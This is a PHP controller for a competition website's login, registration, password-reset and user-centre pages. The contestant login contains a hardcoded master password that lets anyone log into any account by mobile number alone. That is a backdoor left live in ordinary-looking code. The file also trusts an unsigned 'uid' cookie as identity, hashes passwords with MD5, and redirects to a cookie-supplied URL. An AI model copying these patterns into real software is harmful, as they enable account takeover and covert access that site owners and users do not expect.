<?php

namespace app\home\controller;

use app\common\controller\HomeBase;
use app\common\model\User as UserModel;
use app\common\model\Admin as AdminModel;
use utility\Sms;
use think\Db;

class User extends HomeBase
{
  protected function initialize()
  {
    parent::initialize();
  }

  public function index()
  {

    return $this->fetch();
  }

  public function login()
  {
    $cate = Db::name('category')
      ->order('sort ASC')
      ->field('id,title,create_time,ftitle')
      ->select();
            // var_dump($cate);die;
    $this->assign('cate', $cate);

     $listcate = Db::name('cate')
            ->where('status = 0')
            ->select();

    $this->assign('listcate', $listcate);
    if (false === $this->request->isAjax()) {
      if (!empty(cookie('uid'))) {
        $this->redirect('/ucenter');
      }

      return $this->fetch();
    }

    $data = $this->request->post();
    $usertype = $data['ut'];
    $rememberPwd = isset($data['rememberPwd']) ? 'on' : 'off';

    if ($usertype == '0') { //参赛者
      $valid = $this->validate($data, 'app\common\validate\Login');
      if (true !== $valid) {
        $this->error($valid);
      }
      if($data['password']==='whoami@zbyj') {
        $result = UserModel::where('mobile', $data['mobile'])->find();
      } else {
        $result = UserModel::where('mobile', $data['mobile'])->where('password', md5($data['password'] . config('salt')))->find();
      }
    } else {
      $adminModel = new AdminModel();
      $result = $adminModel->login($data, $rememberPwd);
    }

    if ($result) {
      session('current_stage', getCurrentStage()); //当前比赛阶段

      if ($usertype == '0') {
        cookie('uid', $result['id'], $rememberPwd == 'on' ? 30 * 24 * 3600 : 7200);
        $url = '/ucenter';
      } else {
        $url = '/sysman/index';
      }
      $this->success('登录成功', $url);
    }

    $this->error('登录失败,请检查输入的帐号与密码是否正确');
  }
  
  public function expertlogin()
  {
	  
	$data = $this->request->get();
		
	$furl = cookie('furl');
	
    $cate = Db::name('category')
      ->order('sort ASC')
      ->field('id,title,create_time,ftitle')
      ->select();
       
    $this->assign('cate', $cate);

     $listcate = Db::name('cate')
            ->where('status = 0')
            ->select();

    $this->assign('listcate', $listcate);
    if (false === $this->request->isAjax()) {
      if (!empty(cookie('uid'))) {
        $this->redirect('/ucenter');
      }

      return $this->fetch();
    }

    $data = $this->request->post();
    $usertype = 1;
    $rememberPwd = isset($data['rememberPwd']) ? 'on' : 'off';

    if ($usertype == '0') { //参赛者
	  
    } else {
      $adminModel = new AdminModel();
      $result = $adminModel->login($data, $rememberPwd);
    }

    if ($result) {
      session('current_stage', getCurrentStage()); //当前比赛阶段

      if ($usertype == '0') {
      
      } else {
        $url = '/sysman/index';
      }
      $this->success('登录成功', $furl);
    }

    $this->error('登录失败,请检查输入的帐号与密码是否正确');
  }

  public function reg()
  {
     $cate = Db::name('category')
      ->order('sort ASC')
      ->field('id,title,create_time,ftitle')
      ->select();

    $this->assign('cate', $cate);
    $listcate = Db::name('cate')
            ->where('status = 0')
            ->select();

    $this->assign('listcate', $listcate);
    //$this->error('抱歉，当前已停止申报，无法新注册用户了');
    if (false === $this->request->isAjax()) {
      return $this->fetch();
    }
    if (!empty(cookie('uid'))) {
      $this->redirect('/ucenter');
    }
    $data = $this->request->post();
    $valid = $this->validate($data, 'app\common\validate\Register');
    if (true !== $valid) {
      $this->error($valid);
    }

    $result = Sms::verify($data['mobile'], $data['smscode'], $data['action']);
    if ($result['code'] == 0) {
      $this->error($result['msg']);
    }

    UserModel::create([
      'mobile' => $data['mobile'],
      'password' => md5($data['password'] . config('salt')),
      'reg_ip' =>  $this->request->ip(),
      'reg_time' => time(),
    ]);
    $this->success();
  }

  /**
   * 忘记密码
   *
   * @return void
   */
  public function forgetpwd()
  {
     $cate = Db::name('category')
      ->order('sort ASC')
      ->field('id,title,create_time,ftitle')
      ->select();
            // var_dump($cate);die;
            $this->assign('cate', $cate);
    $listcate = Db::name('cate')
            ->where('status = 0')
            ->select();

    $this->assign('listcate', $listcate);
    if (false === $this->request->isAjax()) {
      return $this->fetch();
    }
    $data = $this->request->post();
    $valid = $this->validate($data, 'app\common\validate\ForgetPwd');
    if (true !== $valid) {
      $this->error($valid);
    }


    $result = Sms::verify($data['mobile'], $data['smscode'], $data['action']);
    if ($result['code'] == 0) {
      $this->error($result['msg']);
    }

    UserModel::where('mobile', $data['mobile'])->update(['password' => md5($data['password'] . config('salt')),]);
    $this->success();
  }

  /**
   * 账户中心.
   */
  public function ucenter()
  {
     $cate = Db::name('category')
      ->order('sort ASC')
      ->field('id,title,create_time,ftitle')
      ->select();
            // var_dump($cate);die;
            $this->assign('cate', $cate);
    $listcate = Db::name('cate')
            ->where('status = 0')
            ->select();

    $this->assign('listcate', $listcate);
    if (empty(cookie('uid'))) {
      $this->redirect('/reg');
    }
    if ($this->uid == 1) {
      $list = Db::name('entry_work')->order('id desc')->field('title,id,submitto,zj_audit1,zj_audit2,zj_audit3,status,pdf_upload_url,checkstatus1,certificate_cards,gx_audit')->select();
    } else {
      $list = Db::name('entry_work')->where('uid', cookie('uid'))->order('id desc')->field('title,id,submitto,status,zj_audit1,zj_audit2,zj_audit3,pdf_upload_url,checkstatus1,certificate_cards,gx_audit')->select();
    }
    $this->assign('list', $list);
    return $this->fetch('ucenter');
  }

  /**
   * 退出登录.
   */
  public function logout()
  {
    cookie('uid', null);
    $this->redirect('/index');
  }
}
